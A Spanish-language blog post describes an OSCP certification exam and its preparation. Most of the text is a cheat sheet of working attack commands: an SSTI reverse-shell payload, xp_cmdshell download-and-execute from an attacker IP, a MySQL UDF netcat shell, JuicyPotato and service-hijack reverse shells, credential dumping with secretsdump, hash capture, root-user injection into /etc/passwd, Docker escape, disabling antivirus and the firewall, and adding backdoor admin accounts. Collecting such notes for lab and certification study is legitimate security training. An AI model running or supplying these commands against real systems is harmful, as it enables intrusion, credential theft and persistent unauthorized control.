---
layout: single
title:  "Mi experiencia OSCP. Apuntes"
categories: [posts, certs]
---

## OSCP journey


Os voy a contar como he superado con exito la certificacion Offensive Security Certified Professional (OSCP). Primero voy a contar las cosas que me pasaron y que consejos pueden servir lo primero que recomiendo; NO hacer el examen por la noche, yo lo hice por la noche porque pensé que era buena idea, ya que me podía concentrar mejor y fue lo peor que pude hacer. Otra cosa que recomiendo es gestionar bien el tiempo empezar con la más fácil que es el buffer overflow, aunque yo tuve muchos problemas con eso no se porque se me hacia imposible que me devuelva la reverse shell, siempre se me moría aunque cambiase el payload luego de estar varias horas stuck se me ocurrió que el msfvenom me ejecute [Invoke-Powershell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) y asi pude obtener mi revershell estable .<br>
El tema del **Protoctored** te pone muy nervioso. El ver la cámara encendida todo el día viéndote y que al mismo tiempo vean tu pantalla te hace dudar mucho de las cosas que haces <br>
En mi examen la única máquina que me toco que tenía algún exploit público fue en la de **10 puntos** las demás eran aplicaciones web públicas, ya que las buscabas y encontrabas el código fuente, pero no existían exploits conocidos, tenías que literalmente encontrar un **0 day** luego en la máquina de **25 puntos** la única forma para hacer root no estaba documentado en ningún sitio así que tienes que tener pensamiento lateral para lograrlo exitosamente  <br> 
Otra cosa que recomiendo mucho es no tirar la toalla, ya que cuando solo me faltaba una hora para terminar el examen y solo tenía 60 puntos se me ocurrió intentar de nuevo un attack vector y esta vez si funciono 


### Background

* El path the offensive pentesting de tryhackme [Link](https://tryhackme.com/path-action/pentesting/join).

* La red HoloLive de tryhackme, es una red de intensivo de directorio activo, en la que aprendí muchas tecnicas asi como: amsi bypass, Client-side filters, AppLocker, Vulnerable DLLs y sobretodo pivotin.... La recomiendo mucho 

* Tjnull list hechas por savitar [Link](https://docs.google.com/spreadsheets/d/1-g6fj_vb3g3E4DCnOmRfexBQtTv2zZaJgHiD4g6288U/edit?usp=sharing)

Cuando tenía una parte de la lista de Tjnull decidí comprarme el pack de 2 meses del pen-200 la verdad que no fue buena idea porque yo pensaba que el curso que ellos ofrecen (los videos y los pdf) serian utiles para terminar de prepararme y fue totalmente lo contrario, no aprendí nada de ellos y lo que hicieron fue hacerme perder tiempo. Empecé en los labs mientras termine de hacer la lista de tjnull. <br>
Cuando ya tenía toda la red pública terminada decidí no seguir en los laboratorios del pen-200 y me compre una suscripción del [Proving Grounds](https://www.offensive-security.com/labs/) que fue lo mejor que hice, ya que son máquinas real life y muchas de ellas son retiradas de exámenes pasados


<img src="/assets/cert/digital.png"> 



## Apuntes relevantes 
Mejor web de reverse codes: [Revshells](https://www.revshells.com/)
- [Enum](#enum)
- [Linux Priv esc](#linux-priv-esc)
    * [Check List](#check-list)
    * [Script cron check](#script-cron-check)
    * [Grupos](#ver-a-que-grupo-pertenecemos)
    * [mysql](#si-mysql-se-esta-ejecutando-como-root)
    * [Docker](#docker-escape)
- [Windows Priv esc](#windows-priv-esc)
    * [Checkm list](#win-check-list)
    * [Impresonate Privilege](#seimpersonateprivilege--seassignprimarytoken-enabled)
    * [Backup Privilege](#SeBackupPrivilege)
    * [LoadDriver Privilege](#SeLoadDriverPrivilege)
    * [DNS admins](#dnsadmins)
    * [Server Operatos](#server-operators)
    * [Post Explotation](##windows-post-explotaton)

###  Enum

dns
```
host -t axfr <DOMAIN> <IP>
dnsrecon -d <domain> -t axfr
```
smb vuln check
```
nmap -Pn --script=smb-vuln\* -p 445
```
SSTI python reverse shell one liner


{% highlight python %}
{% raw %}
    for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'").read().zfill(417)}}{% endif %}{% endfor %}

{% endraw %}
{% endhighlight %}


LDAP enum
```
ldapsearch -x -h 10.10.10.182 -b "dc=cascade,dc=local"  | grep "@cascade.local"
```
RPC
```
Obtener usuarios
rpcclient -U "" <IP> -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v -E '0x|DefaultAccount|Guest' | sort -u | tr -d '[]'

```

mssql
```
mssqlclient.py WORKGROUP/reporting@10.10.10.125 -windows-auth  (Siempre hay que poner un dominio y si no tiene o no sabemos cual, intentar con WORKGROUP)
Capturar hash 
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'  
RCE
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1' 
RECONFIGURE

xp_cmdshell whoami /all
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.235/mario.ps1") | powershell -noprofile'
```
Active Directory
```
lookupsid.py anonymous@10.10.16.53 <-- Obtener usuarios validos

ASREP ROAST
GetNPUsers.py htb.local/ -no-pass -usersfile users.txt

Si tenemos algun usuario admin. Dumpear credenciales
secretsdump.py <DOMINIO>/<USER>:<PASS>@10.10.238.227

sincronizar hora
sudo rdate -n <ip>

```

## Linux Priv esc

### Check List
```
sudo -l <-- Revisar si tenemos scripts en los cuales no tengan rutas relativas o en directorios en los que tengamos permiso de escritura
Buscar SUID
find / -perm -u=s -type f 2>/dev/null
Buscat kernel exploits
uname -a

```
### Script cron check
```bash 
old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
	old_process=$new_process
done
```
### Ver a que grupo pertenecemos
```
id
uid=1000(funny) gid=1000(funny) groups=1000(funny),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe
```

### Si mysql se esta ejecutando como root
```
locate lib_mysqludf_sys_64.so

Subir dicho archivo

1. login mysql
2. use mysql;
3. create table mario(line blob);
4. insert into mario values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
5. select * from mario into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
6.  select sys_exec('nc -e /bin/sh 192.168.49.235 22');
```
### Docker escape
```
docker images
docker run -it -v /:/host/ <IMAGE ID> chroot /host/ bash              
```
Si tenemos permiso para escribir enm /etc/passwd
```
crear contrasena con openssl
 openssl passwd -1 -salt ignite mario123
 luego anadir esta linea al /etc/passwd
 mario:$1$ignite$tX4GTN3beMcoVKmIGlkIC0:0:0:root:/root:/bin/bash
su mario
mario123
```
## Windows Priv esc
### Win Check List
```
[Environment]::Is64BitProcess
whoami /priv
whoami /all
net user <USUARIO>
AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
Buscar contraseñas
reg query HKLM /f pass /t REG_SZ /s
```

### SeImpersonatePrivilege  SeAssignPrimaryToken Enabled 
```
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
certutil.exe -f -urlcache -split http://10.10.14.18/nc.exe nc.exe
certutil.exe -f -urlcache -split http://10.10.14.18/JuicyPotato.exe JuicyPotato.exe

.\JuicyPotato.exe -t * -l 1338 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\mario\nc.exe -e cmd 10.10.14.18 3001"

si da error cambiar CLSID

systeminfo -> buscar os -> OS Name:  Microsoft Windows 10 Pro 
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
 
 .\JuicyPotato.exe -t * -l 1338 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\mario\nc.exe -e cmd 10.10.10.19 3002" -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"

windows server 2019
https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0

windows 2003, xp
https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/
```
## SeBackupPrivilege 
```
https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/ 
  crear copia de system reg save HKLM\system system
##DEJAR UN ESPACION AL FINAL DE CADA LINEA  
set context persistent nowriters 
add volume c: alias mario 
create 
expose %mario% z: 
```
## SeLoadDriverPrivilege
```
En la maquina de htb fuse se gana privilegios de la misma manera.
https://www.tarlogic.com/es/blog/explotacion-de-la-directiva-cargar-y-descargar-controladores-de-dispositivo-seloaddriverprivilege/
Hay que compilar el binario

primero crear con msfvenom un reverse y guardarlo en 
C:\Windows\System32\spool\drivers\color\reverse.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.19 LPORT=3001 -f exe -o reverse.exe  

Commandos
upload /home/mario/htb/fuse/ExploitCapcom.exe
upload /home/mario/htb/fuse/LoadDriver.exe
cd C:\\Windows\\System32\\spool\\drivers\\color
upload reverse.exe
upload /home/mario/htb/fuse/Capcom.sys

Ejecutar
C:\Windows\Temp\mario\LoadDriver.exe System\CurrentControlSet\mario C:\Windows\Temp\mario\Capcom.sys
C:\Windows\Temp\mario\ExploitCapcom.exe
```

whoami /groups
## DnsAdmins
```
https://www.abhizer.com/windows-privilege-escalation-dnsadmin-to-domaincontroller/
dnscmd /config /serverlevelplugindll \\10.10.14.19\mario\mario.dll
```
## Server Operators
```
upload /usr/share/windows-resources/binaries/nc.exe
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.2 1234"

sc.exe stop vss
sc.exe start vss
```

### Windows Post Explotaton
Crear Usuario
```
net user mario mario123 /add
net localgroup administrators mario /add
```
enable winrm
```
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```
Disable AV 
```
Set-MpPreference -DisableRealtimeMonitoring $true
netsh advfirewall set allprofiles state off
net localgroup "Remote Desktop Users" Everyone /Add 
```


[Credly](https://www.credly.com/badges/82e259fa-9c93-4f37-bc42-c8442e704a53/public_url)
